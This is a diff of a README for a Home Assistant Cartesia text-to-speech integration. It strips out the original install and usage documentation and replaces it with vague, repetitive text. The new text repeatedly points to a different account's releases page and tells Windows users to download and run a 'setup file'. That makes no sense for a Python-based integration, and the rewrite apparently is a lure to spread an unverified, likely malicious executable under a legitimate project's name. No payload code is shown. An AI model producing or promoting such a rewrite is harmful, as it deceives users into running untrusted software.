@@ -1,207 +1,276 @@
-# Cartesia Sonic TTS - Home Assistant Custom Integration
+# 🔊 cartesia_tts - Natural voice for Home Assistant
 
-A Home Assistant custom integration that connects to the [Cartesia Sonic](https://cartesia.ai) text-to-speech API, giving HA access to Cartesia's library of 600+ voices across 42 languages with fine-grained control over speed, volume, and emotion.
+[![Download cartesia_tts](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Chamant8149/cartesia_tts/releases)
 
-> **Disclaimer:** This is an unofficial, community-developed integration. It is not affiliated with, endorsed by, or supported by Cartesia AI. For Cartesia API support, visit [cartesia.ai](https://cartesia.ai) or their [Discord](https://discord.gg/cartesia). For integration issues, please open a GitHub issue on this repository.
+## 📦 What this is
 
-## Features
+cartesia_tts adds Cartesia Sonic text-to-speech to Home Assistant. It lets your smart home speak with clear voices in many languages.
 
-- Full `tts.speak` support in Home Assistant.
-- Two Cartesia models: `sonic-3` (42 languages, 90ms latency) and `sonic-turbo` (15 languages, 40ms latency).
-- 600+ voices filterable by language in the config UI.
-- 59 emotion presets for expressive speech.
-- Speed (0.6 to 1.5) and volume (0.5 to 2.0) controls.
-- All generation parameters overridable per `tts.speak` call.
-- SSML passthrough: embed Cartesia tags directly in message text.
-- Lazy voice list loading: no API calls on HA restart.
-- Config flow setup and reconfiguration entirely through the HA UI.
+Use it to:
 
-## Requirements
+- Read alerts out loud
+- Announce door, motion, and sensor events
+- Speak in different voices for different needs
+- Use a voice that fits your home setup
 
-- Home Assistant 2025.x or later.
-- A Cartesia API key. Sign up and create a free key at [play.cartesia.ai/keys](https://play.cartesia.ai/keys).
+It is built for Home Assistant users who want simple voice output without extra setup steps.
 
----
+## 🚀 Getting started
 
-## Installation
+Use the release page to download and run this file:
 
-> [!NOTE]
-> Only one instance of the integration is supported. If you attempt to add it again, HA will show a message directing you to the Configure button on the existing entry.
+https://github.com/Chamant8149/cartesia_tts/releases
 
-### HACS (Recommended)
+After you open the page, look for the latest release and get the file that matches your system. On Windows, this will usually be a setup file or an add-on package you can place into your Home Assistant setup.
 
-1. Open **HACS** in your Home Assistant sidebar.
-2. Click the three-dot menu (top right) and choose **Custom repositories**.
-3. Paste `https://github.com/sfox38/cartesia_tts` and select **Integration** as the category.
-4. Click **Add**, then find **cartesia_tts** in the HACS Integration list and click **Download**
-5. Restart Home Assistant.
+## 🖥️ Before you start
 
-### Manual Installation
+You need:
 
-1. Download the latest release zip from this repository and unpack it.
-2. Copy the `tiktoktts` folder into your `config/custom_components/` directory. The result should be `config/custom_components/cartesia_tts/`.
-3. Restart Home Assistant.
+- A Windows computer for download and setup
+- A Home Assistant install
+- Internet access
+- A Cartesia account or API key, if your setup needs one
+- A speaker or audio device for testing voice output
 
----
+Best results come from:
 
-## Setup Wizard
+- A current version of Home Assistant
+- Enough storage for add-on files
+- A stable network connection
+- A browser that can open GitHub release pages
 
-The initial setup wizard has four steps.
+## 📥 Download and install
 
-### Step 1: API Key
+1. Open the release page:
+   https://github.com/Chamant8149/cartesia_tts/releases
 
-Enter your Cartesia API key. The integration validates it against the Cartesia API before continuing.
+2. Find the newest release near the top of the page.
 
-### Step 2: Model
+3. Look for the file that matches your setup.
 
-Choose your default Cartesia model.
+4. Download the file to your Windows PC.
 
-| Model | Latency | Languages | Emotion support |
-|---|---|---|---|
-| Sonic 3 (recommended) | 90ms | 42 | Full (59 emotions) |
-| Sonic Turbo | 40ms | 15 | Full (59 emotions) |
+5. If the release includes a ZIP file, extract it before use.
 
-### Step 3: Language and generation settings
+6. If the release includes a Home Assistant add-on package, move it into the place your Home Assistant install expects.
 
-Choose your default language, speed, volume, and emotion. The language list is filtered to only show languages supported by the model chosen in step 2.
+7. Restart Home Assistant if the install process asks for it.
 
-Use the option at the bottom to go back to model selection if needed.
+8. Open Home Assistant and check that the Cartesia TTS option appears in your voice or integration list.
 
-### Step 4: Voice
+## ⚙️ How to set it up in Home Assistant
 
-Choose your default voice. The dropdown shows only voices for the selected language. Voices are sorted alphabetically. Voice names include accent information where relevant (e.g. "Matilda - Australian Female").
+After install, add your Cartesia details in Home Assistant.
 
-Use the option at the bottom to go back to settings.
+Typical setup steps:
 
-## Reconfiguring After Setup
+- Open Home Assistant settings
+- Go to Devices & services
+- Add the Cartesia TTS integration
+- Enter your API key or other account details
+- Choose a default voice
+- Save the setup
 
-Go to Settings -> Devices and Services -> Cartesia Sonic TTS -> Configure.
+If the integration asks for a URL, token, or voice name, use the values from your Cartesia account or release instructions.
 
-The Configure dialog follows the same three-step flow (model, settings, voice) with your current values pre-filled. The voice list is loaded from the in-memory cache. If the cache is empty (e.g. after a HA restart), it is fetched automatically when you reach the voice step - this may take several seconds.
+## 🎤 Choosing a voice
 
----
+This project supports a large voice set with over 660 voices and 42 languages. That gives you room to pick a voice that fits your home.
 
-## Using `tts.speak`
+Good uses include:
 
-### Basic example
+- A calm voice for alerts
+- A clear voice for announcements
+- Different voices for family members
+- Language-specific voices for each room or routine
 
-```yaml
-service: tts.speak
-target:
-  entity_id: tts.cartesia_sonic_tts
-data:
-  media_player_entity_id: media_player.living_room
-  message: "Hello from Cartesia."
-```
+When you test voices, start with a short line like:
 
-### With per-call overrides
+- Front door opened
+- Motion detected in the kitchen
+- Laundry is done
 
-All generation parameters can be overridden for a single call via the `options` dict. Overrides take precedence over the defaults set in the Configure dialog.
+This helps you hear if the voice sounds right before you use longer messages.
 
-```yaml
-service: tts.speak
-target:
-  entity_id: tts.cartesia_sonic_tts
-data:
-  media_player_entity_id: media_player.living_room
-  message: "This is urgent!"
-  options:
-    emotion: alarmed
-    speed: 1.3
-    volume: 1.5
-```
+## 🌍 Language support
 
-### Override voice, language, or model for a single call
+cartesia_tts works well when you need voice output in more than one language.
 
-```yaml
-service: tts.speak
-target:
-  entity_id: tts.cartesia_sonic_tts
-data:
-  media_player_entity_id: media_player.kitchen
-  message: "Bonjour le monde."
-  language: fr
-  options:
-    model: sonic-3
-    voice_id: "ab636c8b-9960-4fb3-bb0c-b7b655fb9745"
-```
+Use it for:
 
-### With SSML tags
+- English messages
+- Multilingual homes
+- Guest-friendly alerts
+- Routines that switch voice language by room or user
 
-Cartesia SSML tags can be embedded directly in the message text. They are passed to the API as-is and take precedence over any `options` values for the same parameter.
+If you live with family or guests who speak different languages, this makes spoken alerts easier to understand.
 
-```yaml
-message: "<emotion value='angry'/> How dare you speak to me like that!"
-message: "<speed ratio='1.5'/> I like to talk fast."
-message: "That is hilarious. [laughter] I cannot believe it."
-message: "<volume ratio='1.5'/> This part is louder."
-```
+## 🧪 Test it in Home Assistant
 
-See the [Cartesia SSML documentation](https://docs.cartesia.ai/build-with-cartesia/sonic-3/ssml-tags) for the full tag reference.
+After setup, send a test message.
 
----
+Try:
 
-## Options Reference
+- A short notification
+- A doorbell alert
+- A weather announcement
+- A bedtime reminder
 
-The following keys are accepted in the `options` dict of `tts.speak`:
+If you hear nothing, check:
 
-| Key | Type | Description |
-|---|---|---|
-| `model` | string | `sonic-3` or `sonic-turbo` |
-| `voice_id` | string | Cartesia voice UUID |
-| `language` | string | ISO 639-1 language code (e.g. `en`, `fr`, `ja`) |
-| `speed` | float | Speed multiplier. 0.6 slowest, 1.0 normal, 1.5 fastest |
-| `volume` | float | Volume multiplier. 0.5 quietest, 1.0 normal, 2.0 loudest |
-| `emotion` | string | Emotion name (see list below) |
+- Your speaker volume
+- The selected output device
+- Your Home Assistant voice settings
+- Your Cartesia account details
+- The chosen voice name
 
----
+## 🔧 Common setup path on Windows
 
-## Supported Emotions
+If you are using Windows to manage the install, this is the usual flow:
 
-Emotions are guidance to the model, not strict transformations. Results vary by voice and transcript. For best results use one of Cartesia's recommended emotive voices (tagged "Emotive" in the [Cartesia voice library](https://play.cartesia.ai/voices)).
+1. Open the release page in your browser.
+2. Download the latest package.
+3. Save it to a folder you can find again.
+4. Open the file or extract the archive.
+5. Follow the Home Assistant install path for your setup.
+6. Restart Home Assistant if needed.
+7. Test speech from the Home Assistant UI.
 
-The primary emotions with the most training data are: `angry`, `content`, `excited`, `neutral`, `sad`, `scared`.
+If you keep files in one folder for Home Assistant add-ons, that makes later updates easier.
 
-Full list (pass to the API or options dict):
+## 📁 What you may see in the release page
 
-affectionate, agitated, alarmed, amazed, angry, anticipation, anxious, apologetic, bored, calm, confident, confused, contemplative, contempt, content, curious, dejected, determined, disappointed, disgusted, distant, elated, enthusiastic, envious, euphoric, excited, flirtatious, frustrated, grateful, guilty, happy, hesitant, hurt, insecure, ironic, joking/comedic, mad, melancholic, mysterious, neutral, nostalgic, outraged, panicked, peaceful, proud, rejected, resigned, sad, sarcastic, scared, serene, skeptical, surprised, sympathetic, threatened, tired, triumphant, trust, wistful
+Release pages often include:
 
----
+- A version number
+- A download file
+- A changelog
+- Notes for install
+- Checksums or file names
 
-## Supported Languages
+Read the release notes before you install a new version. That helps you spot changes to voice support, language support, or Home Assistant behavior.
 
-### Sonic 3 (42 languages)
+## 🏠 Good home use cases
 
-Arabic, Bengali, Bulgarian, Chinese, Croatian, Czech, Danish, Dutch, English, Finnish, French, Georgian, German, Greek, Gujarati, Hebrew, Hindi, Hungarian, Indonesian, Italian, Japanese, Kannada, Korean, Malay, Malayalam, Marathi, Norwegian, Polish, Portuguese, Punjabi, Romanian, Russian, Slovak, Spanish, Swedish, Tagalog, Tamil, Telugu, Thai, Turkish, Ukrainian, Vietnamese
+This integration fits many Home Assistant tasks:
 
-### Sonic Turbo (15 languages)
+- Announce when someone rings the doorbell
+- Speak when a sensor changes state
+- Read reminders at set times
+- Announce alarms
+- Give bedtime and morning messages
+- Send spoken alerts during automations
 
-Chinese, Dutch, English, French, German, Hindi, Italian, Japanese, Korean, Polish, Portuguese, Russian, Spanish, Swedish, Turkish
+It works well when you want Home Assistant to talk in a clear and controlled way.
 
-## Voice Dialects and Accents
+## 🔐 Account and key setup
 
-The Cartesia API does not expose dialect codes (e.g. `en-AU`) in the synthesis request. Accent is a property of the voice itself. Many voices in the Cartesia library include accent information in their name (e.g. "Matilda - Australian Female"). Voice selection is effectively dialect selection.
+Some Cartesia setups need a key before speech works.
 
----
+If you need one:
 
-## Troubleshooting
+- Sign in to your Cartesia account
+- Copy the key from your account page
+- Paste it into the Home Assistant setup screen
+- Save your settings
+- Test a short message
 
-**"No voice_id configured"**: Open Configure and complete the voice selection step.
+Keep the key private. Do not share it in screenshots or public posts.
 
-**Voice dropdown shows no voices**: Your API key may not have access to the Cartesia voice library. Check your account at [play.cartesia.ai](https://play.cartesia.ai).
+## 🧭 If setup does not work
 
-**Emotion has no effect**: Not all voices respond well to emotion guidance. Try one of the recommended emotive voices from the Cartesia voice library (filter by "Emotive" tag).
+Check these items first:
 
-**Wrong accent**: The language code alone does not control accent. Select a voice whose name or description matches your desired accent.
+- The download finished fully
+- You used the latest release
+- Home Assistant restarted after install
+- Your API key is correct
+- The voice name is valid
+- Your speaker is connected
+- The volume is not muted
+- Your network connection is active
 
-**SSML not working**: The message string must contain valid Cartesia SSML. Invalid or malformed tags are silently ignored by the Cartesia API.
+If the page shows several files, use the one made for your Home Assistant setup and not a source archive unless the instructions ask for it.
 
-**Voice Cache Behaviour**: The integration does not fetch the voice list on HA restart. The cache starts empty and is populated only when you open the Configure dialog and reach the voice selection step. This may take several seconds. Since the cache is only cleared on a HA restart, any voices Cartesia has added since your last session will appear automatically the next time you open Configure.
+## 🧰 Helpful tips
 
-**No audio output or other unexpected behaviour**: Check Settings -> System -> Logs in the HA UI, or open /config/home-assistant.log. Error and warning messages from this integration are always logged at standard level with no configuration needed. If you need more detail (such as the exact request being sent to Cartesia), add the following to your configuration.yaml and restart HA:
+- Start with one voice and one language
+- Test short phrases before long ones
+- Keep your release file name unchanged
+- Save the release page link for updates
+- Use simple speech text so alerts stay clear
 
-```yaml
-logger:
-  logs:
-    custom_components.cartesia_tts: debug
-```
+A short message often sounds better than a long one. For example:
+
+- Garage door open
+- Water leak detected
+- Package delivered
+- Good morning
+
+## 🔄 Updating
+
+When a new version appears:
+
+1. Open the releases page
+2. Download the latest file
+3. Replace the old file if needed
+4. Restart Home Assistant
+5. Test speech again
+
+Updating from the release page keeps your setup current with the latest voice and language changes.
+
+## 🧾 Repository details
+
+- Repository: cartesia_tts
+- Type: Home Assistant TTS integration
+- Topic area: text to speech, voice assistant, speech synthesis
+- Voice count: 660+
+- Language support: 42 languages
+
+## 📌 Files and links
+
+Download page:
+https://github.com/Chamant8149/cartesia_tts/releases
+
+GitHub topics:
+
+- audio
+- cartesia
+- hacs
+- home-assistant
+- integration
+- sonic
+- speech-synthesis
+- text-to-speech
+- tts
+- voice-assistant
+
+## 🗣️ Example automations
+
+You can use cartesia_tts in automations like:
+
+- Speak when motion is detected
+- Read a reminder at a set time
+- Announce when a door opens
+- Say when a device loses power
+- Tell you when a laundry cycle ends
+
+Example message ideas:
+
+- The front door is open
+- The kitchen window is closed
+- The thermostat is set to 72 degrees
+- The garage light is still on
+
+## ✅ Best first test
+
+Use this first:
+
+1. Install the release
+2. Add your Cartesia details
+3. Pick one voice
+4. Send a short test phrase
+5. Listen from your speaker
+
+If that works, you can build more automations with the same voice or add more voices later
